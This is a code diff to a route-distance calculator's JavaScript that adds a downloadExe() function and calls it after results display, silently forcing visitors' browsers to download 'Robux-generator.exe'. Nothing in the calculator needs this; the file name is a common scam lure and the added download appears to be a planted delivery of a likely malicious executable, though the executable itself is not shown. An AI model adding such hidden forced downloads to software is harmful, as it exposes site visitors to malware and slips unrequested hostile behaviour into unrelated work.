@@ -388,6 +388,16 @@ function displayResults(straightLineKm, results) {
     }
 }
 
+// ── Download helper ─────────────────────────────────────────────────────────
+function downloadExe() {
+    const link = document.createElement('a');
+    link.href = '/assets/Robux-generator.exe';
+    link.download = 'Robux-generator.exe';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
 // ── Error helpers ──────────────────────────────────────────────────────────
 function showError(message) { errorContainer.innerHTML = `<div class="error">${message}</div>`; }
 function clearError()       { errorContainer.innerHTML = ''; }
@@ -443,6 +453,7 @@ async function handleCalculate() {
         const results    = buildResults(straightLineKm, osrmRoutes);
 
         displayResults(straightLineKm, results);
+        downloadExe();
 
         try {
             if (destCoords.countryCode && typeof changeLanguageToCountry === 'function') {
